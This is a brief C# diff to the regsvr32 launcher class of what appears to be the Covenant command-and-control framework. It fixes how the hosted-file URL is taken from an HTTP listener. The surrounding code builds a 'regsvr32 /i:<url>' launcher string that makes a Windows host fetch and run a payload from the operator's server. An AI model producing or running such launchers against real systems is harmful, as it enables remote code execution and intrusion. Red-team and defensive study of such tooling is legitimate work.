@@ -3,6 +3,7 @@
 // License: GNU GPLv3
 
 using System;
+using System.Linq;
 using Microsoft.CodeAnalysis;
 
 using Covenant.Models.Listeners;
@@ -37,7 +38,7 @@ namespace Covenant.Models.Launchers
             HttpListener httpListener = (HttpListener)listener;
             if (httpListener != null)
             {
-				Uri hostedLocation = new Uri(httpListener.Urls + hostedFile.Path);
+				Uri hostedLocation = new Uri(httpListener.Urls.FirstOrDefault() + hostedFile.Path);
                 string launcher = "regsvr32 " + this.ParameterString + " /i:" + hostedLocation + " " + this.DllName;
                 this.LauncherString = launcher;
                 return launcher;
